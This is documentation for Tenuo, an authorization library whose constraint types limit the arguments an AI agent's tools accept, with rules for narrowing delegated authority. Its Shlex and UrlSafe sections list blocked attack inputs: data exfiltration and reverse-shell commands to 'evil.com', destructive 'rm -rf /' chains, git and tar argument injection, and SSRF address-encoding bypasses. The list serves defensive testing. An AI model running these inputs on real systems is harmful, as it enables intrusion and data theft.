---
title: Constraints
description: How to use constraints to scope authority precisely
---

# Tenuo Constraints

> How to use constraints to scope authority precisely.

---

## Overview

Constraints are key-value pairs that restrict what a warrant authorizes. When a tool is invoked, Tenuo checks that the arguments satisfy the warrant's constraints.

```python
from tenuo import Warrant, Pattern, Range

# Create warrant with per-tool constraints
warrant = (Warrant.mint_builder()
    .capability("read_file",
        path=Subpath("/data"),         # Path must be under /data/ (secure)
        max_size=Range.max_value(1000) # Size must be ≤ 1000
    )
    .holder(worker_pubkey)
    .ttl(3600)
    .mint(key))

# Tool invocation checks constraints
@guard(tool="read_file")
def read_file(path: str):
    # This code only runs if path matches the warrant constraint
    with open(path) as f:
        return f.read()[:1000]
```

---

## Closed-World Mode (Trust Cliff)

When you define **any** constraint on a tool, Tenuo activates **closed-world mode** for that capability: arguments not explicitly constrained are **rejected by default**.

This is a security feature—once you start defining what's allowed, Tenuo assumes you want strict enforcement.

### The Trust Cliff

| Constraint State | Behavior |
|------------------|----------|
| **No constraints** (empty) | OPEN: Any arguments allowed |
| **≥1 constraint defined** | CLOSED: Unknown arguments rejected |
| **`_allow_unknown=True`** | Explicit opt-out from closed-world |

### Example

```python
from tenuo import Warrant, Pattern

# ❌ One constraint → unknown fields rejected
warrant = (Warrant.mint_builder()
    .capability("api_call", url=Pattern("https://api.example.com/*"))
    .holder(key.public_key)
    .ttl(3600)
    .mint(key))

# This FAILS - 'timeout' is not in the constraint set
api_call(url="https://api.example.com/v1", timeout=30)
# Error: "unknown field not allowed (zero-trust mode)"
```

### Opt-Out with `_allow_unknown`

Use `_allow_unknown=True` to explicitly allow unconstrained fields:

```python
# ✅ Opt-out: allow unknown fields
warrant = (Warrant.mint_builder()
    .capability("api_call",
        url=Pattern("https://api.example.com/*"),
        _allow_unknown=True)
    .holder(key.public_key)
    .ttl(3600)
    .mint(key))

# This SUCCEEDS - 'timeout' is allowed through
api_call(url="https://api.example.com/v1", timeout=30)
```

### Explicitly Allow Specific Fields

Use `Wildcard()` to allow any value for a specific field while keeping closed-world mode:

```python
from tenuo import Warrant, Pattern, Wildcard

# Constrain 'url', allow any 'timeout', reject other unknown fields
warrant = (Warrant.mint_builder()
    .capability("api_call",
        url=Pattern("https://api.example.com/*"),
        timeout=Wildcard())  # Any value OK
    .holder(key.public_key)
    .ttl(3600)
    .mint(key))

# ✅ ALLOWED - both fields are constrained
api_call(url="https://api.example.com/v1", timeout=30)

# ❌ BLOCKED - 'retries' is unknown
api_call(url="https://api.example.com/v1", timeout=30, retries=3)
```

> [!IMPORTANT]
> **`_allow_unknown` is NOT inherited during attenuation.**
>
> When you delegate (attenuate) a warrant, the child defaults to closed-world mode even if the parent had `_allow_unknown=True`. This prevents privilege escalation through delegation.
>
> ```python
> # Parent: open to unknown fields
> parent = (Warrant.mint_builder()
>     .capability("api_call",
>         url=Pattern("https://*"),
>         _allow_unknown=True)
>     .mint(key))
>
> # Child: defaults to closed (even though parent was open)
> child = (parent.grant_builder()
>     .capability("api_call",
>         url=Pattern("https://api.example.com/*"))
>     .grant(key))
>
> # Child CANNOT enable _allow_unknown if parent had it disabled
> # This would fail: child cannot be more permissive than parent
> ```

---

## Constraint Types

### Wildcard

Matches anything. The universal superset that can be attenuated to any other constraint type.

```python
from tenuo import Wildcard

# Allows any value
Wildcard()
```

**Use case:** Root warrants that grant broad authority, which can be narrowed later.

```python
# Parent: any query
with mint(Capability("search", query=Wildcard())):
    ...

# Child: narrowed to specific pattern
with grant(Capability("search", query=Pattern("*public*"))):
    ...
```

**Security**: Wildcard can only appear in root warrants. Attenuating to Wildcard is blocked (would re-widen authority).

> [!NOTE]
> `Wildcard()` is different from `Pattern("*")`. See the [Pattern section below](#pattern-glob) for details.

---

### Pattern (Glob)

Matches strings against Unix shell-style glob patterns.

```python
from tenuo import Pattern

# Suffix wildcard - matches paths starting with /data/
Pattern("/data/*")

# Prefix wildcard - matches emails ending with @company.com
Pattern("*@company.com")

# Middle wildcard - matches specific file in any subdirectory
Pattern("/data/*/config.yaml")

# Single character - matches file1.txt, fileA.txt, etc.
Pattern("file?.txt")

# Character class - matches env-prod, env-staging, env-dev
Pattern("env-[psd]*")

# Exact match (no wildcard)
Pattern("specific-value")
```

**Supported Glob Syntax:**

| Syntax | Description | Example |
|--------|-------------|---------|
| `*` | Matches any characters (including none) | `staging-*` matches `staging-web` |
| `?` | Matches exactly one character | `file?.txt` matches `file1.txt` |
| `[abc]` | Matches any character in set | `[psd]*` matches `prod`, `staging`, `dev` |
| `[!abc]` | Matches any character NOT in set | `[!0-9]*` matches non-numeric start |

**Examples by Wildcard Position:**

| Pattern | Value | Match? | Description |
|---------|-------|--------|-------------|
| `/data/*` | `/data/file.txt` | Yes | Suffix wildcard |
| `/data/*` | `/etc/passwd` | No | Wrong prefix |
| `*@company.com` | `cfo@company.com` | Yes | Prefix wildcard |
| `*@company.com` | `hacker@evil.com` | No | Wrong suffix |
| `/data/*/file.txt` | `/data/reports/file.txt` | Yes | Middle wildcard |
| `/data/*/file.txt` | `/data/reports/other.txt` | No | Filename mismatch |
| `file?.txt` | `file1.txt` | Yes | Single char wildcard |
| `file?.txt` | `file12.txt` | No | Too many chars |

> [!IMPORTANT]
> **Distinction: `Wildcard()` vs `Pattern("*")` vs `"*"`**
>
> These three are **NOT** the same:
>
> 1. **`Wildcard()`** - Universal constraint that can be attenuated to *any* other constraint type (Pattern, Exact, Range, etc.)
> 2. **`Pattern("*")`** - A glob pattern that matches any string, but can only be attenuated to other patterns or Exact
> 3. **`"*"` (string literal)** - Just a regular string value that happens to contain an asterisk
>
> ```python
> # Flexible: Wildcard can become anything
> with mint(Capability("search", query=Wildcard())):
>     with grant(Capability("search", query=Pattern("/data/*"))):  # OK
>         ...
>     with grant(Capability("search", query=Range.max_value(100))):  # OK
>         ...
>
> # Limited: Pattern can only narrow to other patterns or exact values
> with mint(Capability("search", query=Pattern("*"))):
>     with grant(Capability("search", query=Pattern("/data/*"))):  # OK (simple prefix)
>         ...
>     with grant(Capability("search", query=Exact("specific"))):  # OK
>         ...
>     with grant(Capability("search", query=Range.max_value(100))):  # FAILS - Type mismatch
>         ...
> ```
>
> **Best Practice**: Use `Wildcard()` in root warrants for maximum flexibility. Use `Pattern("*")` only if you specifically need glob matching semantics.
>
> **Attenuation Rules for Pattern**:
> - **Suffix wildcard** patterns (`/data/*`) can narrow to longer prefixes (`/data/reports/*`)
> - **Prefix wildcard** patterns (`*@company.com`) can narrow to exact values (`cfo@company.com`)
> - Patterns can always narrow to `Exact()` if the value matches the pattern
> - Complex patterns with multiple wildcards can be narrowed if contained within parent

---

### Exact

Matches exactly one value.

```python
from tenuo import Exact

# Only allows "production"
Exact("production")

# Only allows this specific ID
Exact("user-12345")
```

---

### OneOf

Matches any value in a set.

```python
from tenuo import OneOf

# Allows any of these environments
OneOf(["staging", "production", "dev"])

# Allows specific actions
OneOf(["read", "list"])
```

---

### Range

Constrains numeric values to a range.

```python
from tenuo import Range

# 0 to 100 (inclusive)
Range(min=0, max=100)

# At most 1000
Range.max_value(1000)

# At least 10
Range.min_value(10)
```

> [!WARNING]
> **Precision Limit**: Bounds are stored as 64-bit floats. Integers larger than 2^53 (9,007,199,254,740,992) will lose precision.
>
> **For Snowflake IDs or large 64-bit integers**, use `Exact` or `Pattern` constraints on their string representation instead. Do not use `Range` for values > 2^53.

**Examples:**

| Range | Value | Match? |
|-------|-------|--------|
| `Range.max_value(100)` | `50` | Yes |
| `Range.max_value(100)` | `150` | No |
| `Range(min=10, max=50)` | `25` | Yes |
| `Range(min=10, max=50)` | `5` | No |

---

### Cidr

Constrains IP addresses to a network range using CIDR notation. Supports both IPv4 and IPv6.

```python
from tenuo import Cidr

# IPv4 networks
Cidr("10.0.0.0/8")        # 10.x.x.x
Cidr("192.168.0.0/16")    # 192.168.x.x
Cidr("192.168.1.0/24")    # 192.168.1.x

# IPv6 networks
Cidr("2001:db8::/32")
```

**Examples:**

| Cidr | IP | Match? |
|------|-----|--------|
| `Cidr("10.0.0.0/8")` | `"10.1.2.3"` | Yes |
| `Cidr("10.0.0.0/8")` | `"192.168.1.1"` | No |
| `Cidr("192.168.1.0/24")` | `"192.168.1.100"` | Yes |
| `Cidr("192.168.1.0/24")` | `"192.168.2.1"` | No |

**Use case:** Restrict API calls to internal networks, validate source IPs.

```python
from tenuo import Warrant, ConstraintSet, Cidr

# Only allow requests from internal network
cs = ConstraintSet()
cs.insert("source_ip", Cidr("10.0.0.0/8"))

warrant = (Warrant.mint_builder()
    .capability("api_call", cs)
    .holder(kp.public_key)
    .ttl(3600)
    .mint(kp))
```

**Attenuation:** Child CIDR must be a subnet of parent.

```python
# Parent: 10.0.0.0/8 (all 10.x.x.x)
parent = Cidr("10.0.0.0/8")

# Valid child: 10.1.0.0/16 (narrower)
child = Cidr("10.1.0.0/16")  # OK - Subnet of parent

# Invalid child: 192.168.0.0/16 (different network)
child = Cidr("192.168.0.0/16")  # FAILS - Not a subnet
```

---

### UrlPattern

Validates URLs against scheme, host, port, and path patterns. Provides structured URL validation with proper parsing and normalization - safer than using `Pattern` or `Regex` for URL matching.

```python
from tenuo import UrlPattern

# Match HTTPS URLs to specific host
UrlPattern("https://api.example.com/*")

# Any scheme (HTTP or HTTPS)
UrlPattern("*://api.example.com/*")

# Wildcard subdomain
UrlPattern("https://*.example.com/*")

# Specific port
UrlPattern("https://api.example.com:8443/*")

# Specific path prefix
UrlPattern("https://api.example.com/api/v1/*")
```

**Pattern Components:**

| Component | Syntax | Description |
|-----------|--------|-------------|
| Scheme | `https://`, `*://` | Required. Use `*` for any scheme. |
| Host | `api.example.com`, `*.example.com` | Required. Supports `*` prefix for subdomains. |
| Port | `:8443` | Optional. Omit for default port. |
| Path | `/api/*`, `/v1/users` | Optional. Supports glob patterns. |

**Examples:**

| Pattern | URL | Match? |
|---------|-----|--------|
| `UrlPattern("https://api.example.com/*")` | `"https://api.example.com/v1/users"` | Yes |
| `UrlPattern("https://api.example.com/*")` | `"http://api.example.com/v1"` | No (wrong scheme) |
| `UrlPattern("https://*.example.com/*")` | `"https://www.example.com/home"` | Yes |
| `UrlPattern("https://*.example.com/*")` | `"https://evil.com/home"` | No (wrong domain) |
| `UrlPattern("https://api.example.com:8443/*")` | `"https://api.example.com:443/v1"` | No (wrong port) |

**Use case:** Restrict API calls to specific endpoints, enforce HTTPS, limit to trusted domains.

```python
from tenuo import Warrant, ConstraintSet, UrlPattern

# Only allow HTTPS calls to internal API
cs = ConstraintSet()
cs.insert("endpoint", UrlPattern("https://api.internal.com/v1/*"))

warrant = (Warrant.mint_builder()
    .capability("api_call", cs)
    .holder(kp.public_key)
    .ttl(3600)
    .mint(kp))
```

**Attenuation Rules:**

- **Scheme**: Can narrow (any -> https) but not widen (https -> http)
- **Host**: Can narrow (*.example.com -> api.example.com) but not widen
- **Port**: Can add restriction but not remove
- **Path**: Can narrow (/api/* -> /api/v1/*) but not widen

```python
# Parent: any subdomain, any path
parent = UrlPattern("https://*.example.com/*")

# Valid children
child = UrlPattern("https://api.example.com/*")       # OK - Specific host
child = UrlPattern("https://api.example.com/v1/*")    # OK - Specific host + path

# Invalid children
child = UrlPattern("http://api.example.com/*")        # FAILS - Different scheme
child = UrlPattern("https://*.other.com/*")           # FAILS - Different domain
```

---

### Subpath

Secure path containment constraint that prevents path traversal attacks. This is a **lexical** check - it normalizes `.` and `..` components without filesystem access.

```python
from tenuo import Subpath

# Basic usage
constraint = Subpath("/data")

# Path checks
constraint.contains("/data/file.txt")       # True
constraint.contains("/data/subdir/file.txt")  # True
constraint.contains("/data/../etc/passwd")  # False (traversal blocked)
constraint.contains("/etc/passwd")          # False (not under /data)

# Options
Subpath("/data", case_sensitive=False)  # Windows compatibility
Subpath("/data", allow_equal=False)     # Require strictly under root
```

**Security Features:**

- Normalizes `.` and `..` components (lexically, no I/O)
- Rejects null bytes (C string terminator attack)
- Requires absolute paths
- Optionally case-insensitive (Windows compatibility)
- Does **NOT** follow symlinks (stateless validation)

**Examples:**

| Subpath | Path | Contains? |
|---------|------|-----------|
| `Subpath("/data")` | `/data/file.txt` | Yes |
| `Subpath("/data")` | `/data/subdir/file.txt` | Yes |
| `Subpath("/data")` | `/data` | Yes (allow_equal=true) |
| `Subpath("/data")` | `/data/../etc/passwd` | No (normalized to /etc) |
| `Subpath("/data")` | `/etc/passwd` | No |
| `Subpath("/data")` | `data/file.txt` | No (relative path) |

**Attenuation:** Child root must be contained within parent root.

```python
# Parent: /data
parent = Subpath("/data")

# Valid child: /data/reports (narrower)
child = Subpath("/data/reports")  # OK

# Invalid child: /other (not under parent)
child = Subpath("/other")  # FAILS
```

> [!NOTE]
> **Symlink Handling**
>
> This constraint does NOT resolve symlinks. This is intentional for distributed systems where the file may be on a different machine than the validator. For symlink-aware validation, use `path_jail` at the execution layer. See [Defense in Depth](#defense-in-depth-file-paths).

**Error Handling:**

```python
# Invalid root raises ValueError
Subpath("relative/path")  # ValueError: invalid path 'relative/path': root must be an absolute path

# Non-string arguments raise TypeError (type-safe validation)
constraint = Subpath("/data")
constraint.contains(123)   # TypeError
constraint.contains(None)  # TypeError
```

**Path Normalization:**

- Double slashes are collapsed: `//data//file.txt` → `/data/file.txt`
- Trailing slashes are preserved in root but ignored in matching
- `.` and `..` are resolved lexically (no filesystem access)

---

### UrlSafe

SSRF-safe URL constraint that blocks dangerous URLs by default.

```python
from tenuo import UrlSafe

# Secure defaults - blocks known SSRF vectors
constraint = UrlSafe()
constraint.is_safe("https://api.github.com/repos")  # True
constraint.is_safe("http://169.254.169.254/")       # False (metadata)
constraint.is_safe("http://127.0.0.1/")             # False (loopback)
constraint.is_safe("http://10.0.0.1/")              # False (private IP)

# Domain allowlist - only specific domains allowed
constraint = UrlSafe(allow_domains=["api.github.com", "*.googleapis.com"])

# Custom configuration
constraint = UrlSafe(
    allow_schemes=["https"],           # HTTPS only
    block_private=True,                # Block 10.x, 172.16.x, 192.168.x
    block_loopback=True,               # Block 127.x, ::1, localhost
    block_metadata=True,               # Block cloud metadata endpoints
    block_internal_tlds=True,          # Block .internal, .local, etc.
)
```

**Security Features:**

- Validates URL scheme (default: http, https)
- Blocks private IPs (RFC1918: 10.x, 172.16.x, 192.168.x)
- Blocks loopback (127.x, ::1, localhost)
- Blocks cloud metadata endpoints (169.254.169.254, metadata.google.internal)
- Blocks IP encoding bypasses (decimal, hex, octal, IPv6-mapped)
- Decodes URL-encoded hostnames
- Optional domain allowlist for maximum restriction

**SSRF Vectors Blocked:**

| Attack Vector | Example | Blocked? |
|---------------|---------|----------|
| AWS Metadata | `http://169.254.169.254/` | Yes |
| Loopback | `http://127.0.0.1/` | Yes |
| Private IP | `http://10.0.0.1/` | Yes |
| Decimal IP | `http://2130706433/` (=127.0.0.1) | Yes |
| Hex IP | `http://0x7f000001/` | Yes |
| Octal IP | `http://0177.0.0.1/` | Yes |
| IPv6 Mapped | `http://[::ffff:127.0.0.1]/` | Yes |
| IPv4-Compatible IPv6 | `http://[::127.0.0.1]/` | Yes |
| URL Encoded | `http://%31%32%37%2e%30%2e%30%2e%31/` | Yes |
| File Scheme | `file:///etc/passwd` | Yes |
| localhost | `http://localhost/` | Yes |

**Attenuation:** Child must be at least as restrictive as parent.

```python
# Parent: default SSRF protection
parent = UrlSafe()

# Valid child: stricter (domain allowlist)
child = UrlSafe(allow_domains=["api.github.com"])  # OK

# Invalid child: less restrictive
child = UrlSafe(block_private=False)  # FAILS
```

> [!NOTE]
> **DNS Resolution**
>
> This constraint does NOT perform DNS resolution. This is intentional - DNS resolution is I/O that can block, fail, or be manipulated (DNS rebinding). For DNS-aware validation, use `url_jail` at the execution layer.

> [!IMPORTANT]
> **IPv6 Address Handling**
>
> UrlSafe blocks several IPv6-based bypass attempts:
> - **IPv6-mapped IPv4**: `[::ffff:127.0.0.1]` → blocked (normalized to 127.0.0.1)
> - **IPv4-compatible IPv6**: `[::127.0.0.1]` → blocked (deprecated format but still parsed by some libraries)
> - **IPv6 loopback**: `[::1]` → blocked
> - **IPv6 private ranges**: `fc00::/7`, `fe80::/10` → blocked when `block_private=True`

> [!NOTE]
> **Octal IP Normalization**
>
> The URL parser normalizes octal-notation IPs before validation:
> - `010.0.0.1` → normalized to `8.0.0.1` (octal 010 = decimal 8)
> - `0177.0.0.1` → normalized to `127.0.0.1` → blocked as loopback
> - `012.0.0.1` → normalized to `10.0.0.1` → blocked as private
>
> This provides defense-in-depth: attackers trying to use `010.0.0.1` to access `10.0.0.1` get `8.0.0.1` instead.

> [!TIP]
> **Best Practice: Use Domain Allowlists**
>
> For maximum security, use `allow_domains` to restrict URLs to specific trusted domains:
> ```python
> constraint = UrlSafe(allow_domains=["api.github.com", "*.googleapis.com"])
> ```
> This eliminates IP-based bypass attempts entirely and is the recommended approach for production use.

**Error Handling:**

```python
# Non-string arguments raise TypeError (type-safe validation)
constraint = UrlSafe()
constraint.is_safe(123)   # TypeError
constraint.is_safe(None)  # TypeError

# Invalid/malformed URLs return False (safe default)
constraint.is_safe("")           # False
constraint.is_safe("not-a-url")  # False
```

---

### Shlex

Validates that a shell command string is safe and simple. Ensures the command is a single executable with literal arguments, preventing shell injection.

```python
from tenuo import Shlex

# Allow only specific binaries
constraint = Shlex(allow=["ls", "cat", "grep"])

constraint.matches("ls -la /tmp")           # True
constraint.matches("cat file.txt")          # True
constraint.matches("ls -la; rm -rf /")      # False (operator blocked)
constraint.matches("echo $(whoami)")        # False (command substitution)
constraint.matches("ls $HOME")              # False (variable expansion)
constraint.matches("rm -rf /")              # False (rm not in allowlist)
```

**Security Features:**

| Attack | Example | Blocked? |
|--------|---------|----------|
| Command chaining | `ls; rm -rf /` | ✅ |
| Pipe injection | `cat /etc/passwd \| nc evil.com 80` | ✅ |
| Logical operators | `true && rm -rf /` | ✅ |
| I/O redirection | `echo pwned > /etc/cron.d/x` | ✅ |
| Command substitution | `echo $(whoami)` | ✅ |
| Backtick substitution | `` echo `id` `` | ✅ |
| Variable expansion | `ls $HOME` | ✅ |
| Newline injection | `ls\nrm -rf /` | ✅ |
| Unauthorized binary | `nc -e /bin/sh evil.com` | ✅ |

**Options:**

```python
# Block glob characters too (*, ?, [)
Shlex(allow=["ls"], block_globs=True)
```

> [!WARNING]
> **Tier 1 Mitigation Only**
>
> Shlex validates **shell syntax**, not **tool semantics**. Some tools interpret arguments as commands:
>
> ```python
> # These pass Shlex but the tool executes the argument:
> "git clone --upload-pack='malicious' repo"
> "tar --checkpoint-action=exec=cmd -xf file.tar"
> ```
>
> For complete protection, use `proc_jail` which bypasses the shell entirely via `execve()`.

> [!NOTE]
> **Dangerous Binaries**
>
> Even with valid syntax, some binaries are dangerous:
> - `python`, `perl`, `ruby` — arbitrary code execution
> - `nc`, `curl`, `wget` — network access / SSRF
> - `bash`, `sh`, `env`, `xargs` — shell escape
>
> Only allow specific, low-risk binaries like `ls`, `cat`, `head`, `tail`, `wc`, `grep`.

**Error Handling:**

```python
# Non-string arguments raise TypeError
constraint = Shlex(allow=["ls"])
constraint.matches(123)   # False
constraint.matches(None)  # False

# Empty allowlist raises ValueError
Shlex(allow=[])  # ValueError: Shlex requires at least one allowed binary
```

---

### Regex

Matches strings against regular expressions.

```python
from tenuo import Regex

# Matches production-* pattern
Regex(r"^production-[a-z]+$")

# Matches email format
Regex(r"^[a-z]+@company\.com$")
```

> [!WARNING]
> **Attenuation Limitation**
>
> Regex constraints **cannot be narrowed** during attenuation.
>
> ```python
> from tenuo import Warrant, Regex, Exact
>
> # Parent with regex
> parent = (Warrant.mint_builder()
>     .capability("query", env=Regex(r"^(staging|dev)-.*$"))
>     .holder(key.public_key)
>     .ttl(3600)
>     .mint(key))
>
> # Cannot narrow to different regex (even if provably narrower)
> child = (parent.grant_builder()
>     .capability("query", env=Regex(r"^staging-.*$"))  # FAILS
>     .grant(key))
>
> # Can narrow to Exact value (if it matches parent regex)
> child = (parent.grant_builder()
>     .capability("query", env=Exact("staging-web"))  # OK
>     .grant(key))
>
> # Can keep same regex pattern
> child = (parent.grant_builder()
>     .capability("query", env=Regex(r"^(staging|dev)-.*$"))  # OK
>     .grant(key))
> ```
>
> **Workaround**: If you need to narrow regex constraints during delegation:
> 1. Use `Pattern()` instead (supports simple prefix/suffix narrowing)
> 2. Attenuate to `Exact()` for specific values
> 3. Keep the same regex in child warrants

---

### NotOneOf

Excludes specific values (use sparingly - prefer allowlists).

```python
from tenuo import NotOneOf

# Block admin and root
NotOneOf(["admin", "root"])
```

**Security**: Always prefer `OneOf` (allowlist) over `NotOneOf` (denylist). `NotOneOf` should only be used to "carve holes" in a parent's positive constraint.

---

### Contains

List must contain all specified values.

```python
from tenuo import Contains

# List must include both "read" and "write"
Contains(["read", "write"])
```

**Example:**
```python
from tenuo import Warrant, Contains

# Warrant requires ["read", "write"] permissions
warrant = (Warrant.mint_builder()
    .capability("access_resource", permissions=Contains(["read", "write"]))
    .holder(key.public_key)
    .ttl(3600)
    .mint(key)
)

# Matches: ["read", "write", "admin"]
# Doesn't match: ["read"] (missing "write")
```

---

### Subset

List must be a subset of allowed values.

```python
from tenuo import Subset

# List must only contain allowed values
Subset(["staging", "dev", "test"])
```

**Example:**
```python
from tenuo import Warrant, Subset

# Warrant allows only specific environments
warrant = (Warrant.mint_builder()
    .capability("deploy", environments=Subset(["staging", "dev"]))
    .holder(key.public_key)
    .ttl(3600)
    .mint(key)
)

# Matches: ["staging"]
# Matches: ["staging", "dev"]
# Doesn't match: ["staging", "production"] (includes disallowed "production")
```

---

### All (AND)

All nested constraints must match.

```python
from tenuo import All, Pattern, Range

# Path must match pattern AND size must be in range
All([
    Pattern("/data/*"),
    Range.max_value(1000)
])
```

**Use case:** Combine multiple constraint types for the same parameter.

---

### AnyOf (OR)

At least one nested constraint must match.

```python
from tenuo import AnyOf, Pattern

# Path must match at least one pattern
AnyOf([
    Pattern("/data/reports/*"),
    Pattern("/data/analytics/*")
])
```

> [!NOTE]
> **`Any` vs `AnyOf`**: These are different!
> - `AnyOf([...])` - OR composite: at least one constraint must match
> - `Any()` - Alias for `Wildcard()`: allows any value for a specific field in zero-trust mode

---

### Not

Negation of a constraint.

```python
from tenuo import Not, Exact

# Anything except "production"
Not(Exact("production"))
```

**Security**: Use sparingly. Prefer positive allowlists.

---

### CEL (Common Expression Language)

Complex logic using CEL expressions for advanced authorization rules.

> [!NOTE]
> **Optional Feature (Rust)**: CEL support requires the `cel` feature flag:
> ```toml
> tenuo = { version = "0.1.0-beta.1", features = ["cel"] }
> ```
> This reduces dependencies for users who don't need CEL. Without the feature, CEL
> constraints can still be deserialized (for wire format interoperability), but 
> evaluation returns `FeatureNotEnabled { feature: "cel" }`.
> 
> Python SDK always includes CEL support.

```python
from tenuo import CEL

# Simple comparison
CEL("amount < 10000 && amount > 0")

# Multi-parameter validation
CEL("budget < revenue * 0.1 && currency == 'USD'")
```

**How it works:**
- CEL expressions evaluate to **boolean** (true/false)
- For **object values**, each field becomes a top-level variable
- For **primitive values**, the value is available as `value`
- Expressions are **compiled once** and cached for performance (max 1000 entries)

**Example:**
```python
from tenuo import Warrant, CEL

# Budget must be less than 10% of revenue
warrant = (Warrant.mint_builder()
    .capability("create_campaign", 
        budget_check=CEL("budget < revenue * 0.1 && budget > 0"))
    .holder(key.public_key)
    .ttl(3600)
    .mint(key))

# When tool is called with:
# create_campaign(budget=5000, revenue=100000, ...)
# CEL evaluates: 5000 < 100000 * 0.1 && 5000 > 0 -> true (OK)
```

#### Standard Library Functions

Tenuo provides built-in functions for common use cases:

**Time Functions:**

```python
# Check if timestamp hasn't expired
CEL("!time_is_expired(deadline)")

# Only allow if created within last hour
CEL("time_since(created_at) < 3600")

# Get current time (requires dummy arg due to library limitation)
CEL("time_now(null).startsWith('2024')")
```

| Function | Signature | Description |
|----------|-----------|-------------|
| `time_now(unused)` | `(_) -> String` | Returns current time in RFC3339 format |
| `time_is_expired(ts)` | `(String) -> bool` | Checks if RFC3339 timestamp has passed |
| `time_since(ts)` | `(String) -> i64` | Seconds since RFC3339 timestamp (0 if invalid/future) |

**Network Functions:**

```python
# Only allow requests from internal network
CEL("net_in_cidr(ip, '10.0.0.0/8') || net_in_cidr(ip, '192.168.0.0/16')")

# Block public IPs
CEL("net_is_private(source_ip)")
```

| Function | Signature | Description |
|----------|-----------|-------------|
| `net_in_cidr(ip, cidr)` | `(String, String) -> bool` | Check if IP (v4/v6) is in CIDR block |
| `net_is_private(ip)` | `(String) -> bool` | Check if IP is in private range (RFC 1918) |

**Time-bounded Example:**
```python
from tenuo import Warrant, CEL

# Only allow if order created within last 24 hours
warrant = (Warrant.mint_builder()
    .capability("process_order", 
        freshness=CEL("time_since(created_at) < 86400"))
    .holder(key.public_key)
    .ttl(3600)
    .mint(key))
```

**Network Example:**
```python
from tenuo import Warrant, CEL

# Only allow API calls from private network
warrant = (Warrant.mint_builder()
    .capability("api_call", 
        network=CEL("net_in_cidr(source_ip, '10.0.0.0/8')"))
    .holder(key.public_key)
    .ttl(3600)
    .mint(key))
```

#### CEL Attenuation

Child CEL constraints are automatically combined with parent using AND logic:

```python
from tenuo import Warrant, CEL

# Parent: budget < 10000
parent = (Warrant.mint_builder()
    .capability("spend", budget_rule=CEL("budget < 10000"))
    .holder(key.public_key)
    .ttl(3600)
    .mint(key))

# Child: Add additional constraint (auto-AND'd)
child = (parent.grant_builder()
    .capability("spend", budget_rule=CEL("currency == 'USD'"))
    .grant(key))

# Effective child expression: (budget < 10000) && (currency == 'USD')
```

#### Syntactic Monotonicity (Conservative Approach)

Tenuo enforces **Syntactic Monotonicity** for CEL, not Semantic Monotonicity.

Child expression must **literally** be `(parent) && new_predicate`. It cannot be a semantically equivalent but differently structured expression.

```python
from tenuo import Warrant, CEL

# Parent CEL
parent = (Warrant.mint_builder()
    .capability("api_call", network=CEL("net_in_cidr(ip, '10.0.0.0/8')"))
    .holder(key.public_key)
    .ttl(3600)
    .mint(key))

# REJECTED: Semantically narrower but not syntactically derived
child = (parent.grant_builder()
    .capability("api_call", network=CEL("net_in_cidr(ip, '10.1.0.0/16')"))  # FAILS
    .grant(key))
# Even though 10.1.0.0/16 is subset of 10.0.0.0/8, this is REJECTED

# ALLOWED: Syntactically derived (AND'd)
child = (parent.grant_builder()
    .capability("api_call", 
        network=CEL("(net_in_cidr(ip, '10.0.0.0/8')) && net_in_cidr(ip, '10.1.0.0/16')"))
    .grant(key))
# Now it's ALLOWED because it's (parent) && additional_check
```

#### Why Syntactic?

Semantic analysis (proving one expression is strictly narrower) requires:
- Automated theorem proving
- Understanding domain semantics (CIDR blocks, time logic, etc.)
- Potential false negatives or security holes

Syntactic monotonicity is **conservative but secure**: If the child is `(parent) && X`, it's guaranteed to be narrower or equal.

**Recommendation**: Use simpler constraint types (Pattern, Range, OneOf) when possible. Reserve CEL for truly complex logic that can't be expressed otherwise.

#### Security Properties

**Sandboxed Execution**: CEL cannot execute arbitrary code, only evaluate expressions  
**Deterministic**: Same inputs always produce same results  
**Cached Programs**: Compiled expressions cached (max 1000) for performance  
**Type Safe**: Must return boolean or evaluation fails  
**No Side Effects**: Expressions are pure - no I/O, no state mutation  
**Safe Standard Library**: Only time/network parsing functions, no file/network I/O

#### Security Considerations

##### DoS Protection

While CEL expressions are sandboxed, extremely complex expressions could still consume CPU:

```python
# Potentially expensive (though bounded by compilation)
CEL("(((((a && b) || (c && d)) && ((e || f) && (g || h))) || ...) ...")
```

**Mitigations in place:**
- **Compilation fails** on malformed expressions (syntax errors caught early)
- **Cache limit** (1000 entries) prevents unbounded memory growth
- `cel-interpreter` v0.8.1 (no known DoS vulnerabilities)

##### Best Practices
- **Keep expressions simple** - prefer built-in constraint types when possible
- **Test expressions** before deployment with representative inputs
- **Use syntactic attenuation** - child must be `(parent) && X` for safety

##### Important Notes
- CEL expressions **must return boolean**. Non-boolean results cause `CelError`.
- The constraint key (e.g., `"budget_check"`) is informational; the expression defines the logic.
- **Syntactic monotonicity** is enforced for attenuation (see above).
- Standard library functions are safe and deterministic (no I/O beyond time/IP parsing).

---

## Constraint Narrowing (Attenuation)

When attenuating a warrant, child constraints must be **contained** within parent constraints.

### Attenuation Compatibility Matrix

| Parent Type | Can Attenuate To |
|-------------|------------------|
| `Wildcard()` | **Any** constraint type (universal) |
| `Pattern()` | Pattern (if narrower), Exact (if matches) |
| `Regex()` | **Same** Regex only, Exact (if matches) |
| `Exact()` | Same Exact only |
| `OneOf()` | OneOf (subset), NotOneOf, Exact (if in set) |
| `NotOneOf()` | NotOneOf (more exclusions) |
| `Range()` | Range (narrower bounds), Exact (if in range) |
| `Cidr()` | Cidr (subnet), Exact (if IP in network) |
| `UrlPattern()` | UrlPattern (narrower), Exact (if matches) |
| `Contains()` | Contains (more required values) |
| `Subset()` | Subset (fewer allowed values) |
| `All()` | All (more constraints) |
| `AnyOf()` | AnyOf (fewer alternatives) |
| `CEL()` | CEL (conjunction with parent) |

**Key Limitations**:
- **Regex**: Cannot narrow to different regex patterns (undecidable subset problem)
- **Exact**: Cannot change value at all
- **Range**: If parent bound is exclusive, child cannot make it inclusive at the same value (would widen)
- **No attenuation TO Wildcard**: Would re-widen authority
- **Not**: Attenuation not supported (use positive constraints instead)

### Cross-Type Containment

Some constraint types can contain different types during attenuation:

| Parent | Child | Containment Rule |
|--------|-------|------------------|
| `Wildcard()` | Any type | Universal parent - contains everything |
| `Pattern("*@co.com")` | `Exact("cfo@co.com")` | Child matches parent glob |
| `Regex(r"^dev-.*")` | `Exact("dev-web")` | Child matches parent regex |
| `Range(min=0, max=100)` | `Exact("50")` | Child numeric value within range |
| `Cidr("10.0.0.0/8")` | `Exact("10.1.2.3")` | Child IP within parent network |
